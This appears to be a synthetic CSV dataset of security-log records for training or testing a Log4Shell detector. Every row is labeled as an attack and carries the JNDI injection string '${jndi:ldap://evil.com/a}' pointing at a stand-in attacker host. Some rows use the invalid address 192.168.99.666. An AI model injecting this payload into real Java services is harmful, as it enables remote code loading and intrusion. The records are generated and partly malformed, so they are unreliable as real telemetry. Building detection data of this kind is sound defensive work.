timestamp,src_ip,dst_ip,process_name,file_hash,signature_status,outbound_conn_5min,dns_query,log_line,jndi_present,entropy,label
2025-11-28T06:19:56.013391,192.168.1.171,185.45.67.88,java.exe,89d473b43783d402bd6faff76b14d56110c1ea6443e98b4d2c03d3a53dc7c966,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.027,log4j_attack
2025-11-28T06:19:56.013485,192.168.1.121,192.168.99.666,java.exe,764159f33e397f9698aebead5198b0e66572428d0023d378d21331db0dd3c9da,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.978,log4j_attack
2025-11-28T06:19:56.013510,192.168.1.201,104.21.45.67,java.exe,9c3676b0c8e4696cae5a3a4f2d3161aed23a1b2ae15754901c0e7b4c7580bb18,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.05,log4j_attack
2025-11-28T06:19:56.013529,192.168.1.34,185.45.67.88,java.exe,c960e6cb60fd6d536b9aef59fb58f42433f0f8f0b80ba33dd966911add7bed03,Valid,79,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.86,log4j_attack
2025-11-28T06:19:56.013546,192.168.1.141,185.45.67.88,java.exe,9a946b70badd7fb3027d3a1bfcf32c96994e4896137eef0d67296af3ebcc5d3f,Valid,64,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.322,log4j_attack
2025-11-28T06:19:56.013563,192.168.1.22,185.199.108.33,java.exe,85d9c8031c68b5d4bccb5afb54a056a2a21609d6ac8b4a2b4a1fad8479654e14,Valid,27,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.986,log4j_attack
2025-11-28T06:19:56.013701,192.168.1.230,185.199.108.33,java.exe,4de6571e5ab793cc0be7ceb3edf3cbc85ffd93922e4bbd001d333a7418112f48,Valid,42,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.206,log4j_attack
2025-11-28T06:19:56.013786,192.168.1.82,192.168.99.666,java.exe,335c35ad8051ff51de2a2a8f6250b6f02731a09f50096f1454838e51f378d210,Valid,63,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.103,log4j_attack
2025-11-28T06:19:56.013812,192.168.1.110,192.168.99.666,java.exe,a98e460a9984f83f63403973b95ebfd41129e0215997a6cf8a47921227bead78,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.464,log4j_attack
2025-11-28T06:19:56.013851,192.168.1.240,185.199.108.33,java.exe,0a19846d93b31f77e129e5a38f8f8c6a49b2b42fb073a0932aaf76e4b95d0b14,Valid,76,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.314,log4j_attack
2025-11-28T06:19:56.013870,192.168.1.202,192.168.99.666,java.exe,06b7dba477300d9e4db9aad20fb27fd15e2adf65f78c6784cc67b1da79cace0a,Valid,35,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.15,log4j_attack
2025-11-28T06:19:56.013905,192.168.1.220,104.21.45.67,java.exe,291090d3cd5954547d1d6000141ed7d803d1c2d79888070d14ba7f37c7c5c636,Valid,72,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.062,log4j_attack
2025-11-28T06:19:56.013934,192.168.1.47,192.168.99.666,java.exe,961c08c1bd47e8165d61cfa35d43b17147f49e387c3573fa485f4c2a3d9378e0,Valid,47,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.887,log4j_attack
2025-11-28T06:19:56.013951,192.168.1.123,185.199.108.33,java.exe,21d70ac057be79e736c23fce449224cc520e2bc16d0f3353c5577ef7996e2a62,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.982,log4j_attack
2025-11-28T06:19:56.013967,192.168.1.77,104.21.45.67,java.exe,3ca40e603cd8f0c3ba11ec4e2943535023537c1f2ccd01ecd27084c4fb7696ff,Valid,35,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.945,log4j_attack
2025-11-28T06:19:56.013983,192.168.1.10,104.21.45.67,java.exe,f66b1292579405dd00839fd261e424e7def4978532b12bc171a64d99cd8773aa,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.244,log4j_attack
2025-11-28T06:19:56.013999,192.168.1.32,185.45.67.88,java.exe,c8adbadce8851823a944e8d58cfde18c685635101b22b1fe5f696d93eb47773c,Valid,37,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.396,log4j_attack
2025-11-28T06:19:56.014015,192.168.1.117,45.32.123.99,java.exe,c5fa40bc6a0d7e2edf306492eecbdbad422a346991567236eece1e2a4b94a7a0,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.893,log4j_attack
2025-11-28T06:19:56.014032,192.168.1.245,192.168.99.666,java.exe,7f7a068e91fcc75fca5f790b15b25c29bda436c63801a363d7a4f5a0385e6bdc,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.149,log4j_attack
2025-11-28T06:19:56.014048,192.168.1.170,104.21.45.67,java.exe,ba28264592b90bf2df6b9b348ad08cf2b2a75efe1b816738cd1274f2511faaa1,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.476,log4j_attack
2025-11-28T06:19:56.014065,192.168.1.10,192.168.99.666,java.exe,367f03b25129e7bd9749ae0773cbdbe66d65b28e81f99d85048743d13289f62a,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.076,log4j_attack
2025-11-28T06:19:56.014082,192.168.1.161,45.32.123.99,java.exe,c74ba44aded4f939f9ad40cc7236946be93e70777c1ceeab5881f64674f43617,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.114,log4j_attack
2025-11-28T06:19:56.014099,192.168.1.92,104.21.45.67,java.exe,fa2eac3f3b6ca5e3c00a8128670d9547ad5b4fc598f248544acc1f874269d105,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.381,log4j_attack
2025-11-28T06:19:56.014115,192.168.1.187,185.199.108.33,java.exe,e7431b0c7f2d46f2fe9ed836bc177a7ab7cfc21c4a616ebefe9341c8c8b14651,Valid,76,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.939,log4j_attack
2025-11-28T06:19:56.014131,192.168.1.240,185.199.108.33,java.exe,ee78a396b81c71a701a288bfa22f427f0559d1d07be1d37473c12c4f3838f831,Valid,58,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.381,log4j_attack
2025-11-28T06:19:56.014149,192.168.1.125,192.168.99.666,java.exe,829421b053c73cd79fad4e955ccf6c0404f249223d3f775636814748778edeee,Valid,25,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.44,log4j_attack
2025-11-28T06:19:56.014166,192.168.1.213,185.45.67.88,java.exe,87ec073596428505e06728677b670a4f2cba3ab5845111674113bba31fd0b447,Valid,58,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.818,log4j_attack
2025-11-28T06:19:56.014183,192.168.1.236,45.32.123.99,java.exe,2f4aea99072a74878d8fa7f74c645c9481f8a848072985acb22513d0389411cf,Valid,72,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.203,log4j_attack
2025-11-28T06:19:56.014199,192.168.1.186,185.199.108.33,java.exe,09c945b183caa442a3c8b727d5ca681b17d4a91a6a8d8694e6f9af87ec80db2c,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.163,log4j_attack
2025-11-28T06:19:56.014216,192.168.1.190,45.32.123.99,java.exe,0a81befa33d3ed18ed928b60c4d7465fcf2c45c8f2ca23c278c9955e02a3a146,Valid,59,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.875,log4j_attack
2025-11-28T06:19:56.014232,192.168.1.142,104.21.45.67,java.exe,01d30cc1dec569913a49065a48d06f8239c8e20ddf0d8135c5c7272a184fea87,Valid,75,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.39,log4j_attack
2025-11-28T06:19:56.014248,192.168.1.209,185.199.108.33,java.exe,3db917071fbe8baf13e43fde97445cdcf01ad7a0f7692b66a533ba6b8dc1140f,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.489,log4j_attack
2025-11-28T06:19:56.014265,192.168.1.171,45.32.123.99,java.exe,47f3df92fbc69ebbc4dddd82446a3dfe26c0b0bf04b56b6312f49e25b9730f95,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.842,log4j_attack
2025-11-28T06:19:56.014282,192.168.1.171,192.168.99.666,java.exe,81230875171faec818a25aa4ca6a461c292d34f27f909567be6e4134d9f908f1,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.338,log4j_attack
2025-11-28T06:19:56.014298,192.168.1.17,104.21.45.67,java.exe,e08fc4eed1ef75c30d9039e075a1e79d26fa1aa55c7fe8b34ffcc0232ccaf0cd,Valid,42,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.369,log4j_attack
2025-11-28T06:19:56.014315,192.168.1.237,192.168.99.666,java.exe,d7bd79b44def4702ab558e61f3f7e266e8b453a2fe51540b63c24f2eae9eb65d,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.994,log4j_attack
2025-11-28T06:19:56.014455,192.168.1.248,104.21.45.67,java.exe,e2eafc1ddba8e33639aad8d8cf652f57504dbf8da9f502a17875919cd3328243,Valid,79,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.413,log4j_attack
2025-11-28T06:19:56.014491,192.168.1.31,185.45.67.88,java.exe,c1d4330c94957d6e18d82572e216aaf8378ac547bc13845e07c91e7e814a83b9,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.38,log4j_attack
2025-11-28T06:19:56.014509,192.168.1.165,185.45.67.88,java.exe,e67030c14538ec9ca421400a260ffba93ad58bbc0aaf6830240fec7d9d679660,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.071,log4j_attack
2025-11-28T06:19:56.014525,192.168.1.11,192.168.99.666,java.exe,ee3090960d86c99965698af77553fd454854afa6e06d04740fffc08d4ce9a433,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.054,log4j_attack
2025-11-28T06:19:56.014543,192.168.1.143,185.45.67.88,java.exe,a209d7dbfcca7a55626e38e80fe0a4944b7018cea95cf3f99212abfa8bcb7242,Valid,59,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.105,log4j_attack
2025-11-28T06:19:56.014563,192.168.1.51,185.45.67.88,java.exe,90012f669c54d7237b00b5530f23f9b3682f71f2a1bc3706e38a6f6c6e9f7889,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.807,log4j_attack
2025-11-28T06:19:56.014580,192.168.1.79,192.168.99.666,java.exe,d314e5aa2e3589550f64a351d9bbe54d538d0c358b75e1418b04ea0705e2ea74,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.111,log4j_attack
2025-11-28T06:19:56.014599,192.168.1.138,185.45.67.88,java.exe,07a542dc458320f7156fd6c5a79ea8c0c9f2aa9138d5f434d67dddeec343383d,Valid,56,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.145,log4j_attack
2025-11-28T06:19:56.014616,192.168.1.148,185.45.67.88,java.exe,70fbcda1b986ef16aeb743bb5b6effeb56b1d58b5ec6c3d055df64d01cc04875,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.999,log4j_attack
2025-11-28T06:19:56.014633,192.168.1.180,45.32.123.99,java.exe,63768d01a3b954daef08f6cfcb40a40d65cb30087e1872771ddf86157b7dbd5e,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.81,log4j_attack
2025-11-28T06:19:56.014657,192.168.1.228,185.45.67.88,java.exe,b13d9a34fbc8af195c198fbff7b8b24bc2312e695f483fadba66dcfe5844605d,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.396,log4j_attack
2025-11-28T06:19:56.014685,192.168.1.165,185.199.108.33,java.exe,de6c7ecc95111135f6076b326ec9886f997e445cdd475f60ffd7cd2ca5f92eef,Valid,27,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.299,log4j_attack
2025-11-28T06:19:56.014703,192.168.1.171,45.32.123.99,java.exe,cafeacbac188cbace7aab11b16409778cc126174a97a460b2a34ff83133e5815,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.063,log4j_attack
2025-11-28T06:19:56.014720,192.168.1.31,45.32.123.99,java.exe,93c74d327068b0368bcc868248a5cb0f8d028ab4a68002352d914417a4486d77,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.426,log4j_attack
2025-11-28T06:19:56.014740,192.168.1.14,185.45.67.88,java.exe,61686e97a9de9728b98bf7d2df033f47e07c0d79d684f2b7d5885b53565a1267,Valid,30,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.204,log4j_attack
2025-11-28T06:19:56.014757,192.168.1.185,185.199.108.33,java.exe,1f1c34ddf42e6c49e8baadec077eb64299c1e418067f0bec352cae4a6a109222,Valid,49,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.094,log4j_attack
2025-11-28T06:19:56.014774,192.168.1.237,185.45.67.88,java.exe,4af543d58d5861faa3893eec3fee392ae1d0e527cd04b49554b390edb3706b52,Valid,78,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.403,log4j_attack
2025-11-28T06:19:56.014791,192.168.1.102,45.32.123.99,java.exe,de29b3fcfb685d21d7251eba6cdf236631ea33a68faf5b61613b90b29ca16fd4,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.362,log4j_attack
2025-11-28T06:19:56.014808,192.168.1.174,45.32.123.99,java.exe,e32c258ede7dd14c35c9d708c71f1e30eba6eae5dad6a00662f0eeb049ec225f,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.951,log4j_attack
2025-11-28T06:19:56.014825,192.168.1.208,185.45.67.88,java.exe,df79cf51f6f7b91d7ac4236a3a06a626524a164efa8089ca34463845a34f6024,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.211,log4j_attack
2025-11-28T06:19:56.014842,192.168.1.162,185.45.67.88,java.exe,7cdf50898e6f5c1f753462c5e1900472096aedcd1b92f7710ba0df1c62529a42,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.055,log4j_attack
2025-11-28T06:19:56.014859,192.168.1.165,45.32.123.99,java.exe,2929c095b645ce8760467a721925d9542ac34515672e94d8181c658666b4bced,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.203,log4j_attack
2025-11-28T06:19:56.014879,192.168.1.126,192.168.99.666,java.exe,2a200af59126af409b3d2ebb9cba02ea3d93161ee0bff9e640f47a2c3d878ebf,Valid,80,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.222,log4j_attack
2025-11-28T06:19:56.014911,192.168.1.201,45.32.123.99,java.exe,5a490cec2afe2a1b11d64d7f3a9a56792dd7827cbf9d77625b8d5ce3fa953a8c,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.375,log4j_attack
2025-11-28T06:19:56.014927,192.168.1.30,192.168.99.666,java.exe,fcc264de32ccc9540424429b8da3822f387960860583f73303fa8c8b75e4940f,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.344,log4j_attack
2025-11-28T06:19:56.014943,192.168.1.218,185.199.108.33,java.exe,25bd6498b732e18363f049f87c2db936b077cbc7e8c8085cbda4121f4bf64dba,Valid,52,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.359,log4j_attack
2025-11-28T06:19:56.014958,192.168.1.120,192.168.99.666,java.exe,14b357f01b46f1265866bcd4b3df2e411c07afc46180b4b53b007a6a43e5e701,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.288,log4j_attack
2025-11-28T06:19:56.014974,192.168.1.52,45.32.123.99,java.exe,a23c740a8edb44dd64b7e196e0cb9592199d9a5f272dbad492cbb0b210346349,Valid,47,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.262,log4j_attack
2025-11-28T06:19:56.014990,192.168.1.96,185.45.67.88,java.exe,c00da375507ae21db1a4111939124573e343a2bcc917b3625b7955604c792f34,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.433,log4j_attack
2025-11-28T06:19:56.015007,192.168.1.56,192.168.99.666,java.exe,5903cfdb277d9cd89f718b5b81c2b67e9f963d5b2dfd5d8876ce910c1425ae92,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.962,log4j_attack
2025-11-28T06:19:56.015023,192.168.1.180,45.32.123.99,java.exe,817ad68eb511b65ce68a3081c4dd05bec4b6f809f2b340416535091265cdd9c0,Valid,73,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.924,log4j_attack
2025-11-28T06:19:56.015038,192.168.1.76,185.199.108.33,java.exe,43524fab7ad2bb17309c0fd1dd03654a2d99ecdff84a5c2c1895cdda2513ed6d,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.06,log4j_attack
2025-11-28T06:19:56.015055,192.168.1.86,104.21.45.67,java.exe,4b2852859f0e587fd1a728d05bf2b0a97f5d7a9a3885531fe485e41821f5a6f6,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.288,log4j_attack
2025-11-28T06:19:56.015071,192.168.1.41,45.32.123.99,java.exe,b6c2089de880bdd3d8826abef10be0a1cd85a18a5b726a5cbfd3875ebfd64d0d,Valid,44,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.995,log4j_attack
